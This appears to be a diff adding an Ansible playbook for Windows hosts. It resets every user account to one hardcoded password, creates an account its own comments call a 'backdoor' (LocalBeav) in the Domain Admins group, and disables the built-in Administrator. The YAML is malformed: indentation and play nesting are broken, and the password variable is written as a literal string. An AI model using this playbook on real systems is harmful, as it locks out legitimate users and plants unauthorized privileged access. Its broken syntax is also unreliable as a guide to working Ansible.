@@ -1,0 +1,59 @@
+- name: Change all user passwords on Windows
+  hosts: windows
+  gather_facts: no
+  tasks:
+    - name: Get all users on the system
+      ansible.windows.win_user_facts:
+
+      - name: Change password for each user
+      ansible.windows.win_user:
+        name: "{{ item.name }}"
+        password: "TheWheelsOnTheBusGoRound234"
+        update_password: always
+      loop: "{{ ansible_facts.users }}"
+        # when: item.name != 'Administrator'  # Optionally exclude certain users like Administrator
+
+
+    - name: Change passwords for all users
+      hosts: windows
+      gather_facts: no
+      vars_prompt:
+        - name: "user_password"
+      prompt: "Enter the password for all users"
+      private: yes
+
+      tasks:
+        - name: Gather all users on the machine
+      ansible.windows.win_user_facts:
+        - name: Change password for each user
+      ansible.windows.win_user:
+        name: "{{ item.name }}"
+      password: user_password
+      update_password: always
+      loop: "{{ ansible_facts.users }}"
+
+
+
+    - name: Create backdoor account "LocalBeav"
+      gather_facts: no
+      vars_prompt:
+        - name: "user_password"
+      prompt: "Enter the password for the backdoor account"
+      private: yes
+
+      tasks:
+        - name: create new user
+      ansible.windows.win_user:
+        name: LocalBeav
+      password: user_password
+      state: present
+      groups:
+        - Users
+        - Domain Admins #maybe not the correct syntax for this group?
+
+
+    - name: Disable Administrator
+      ansible.windows.win_user:
+        name: Administrator
+      state: present
+      enable: no
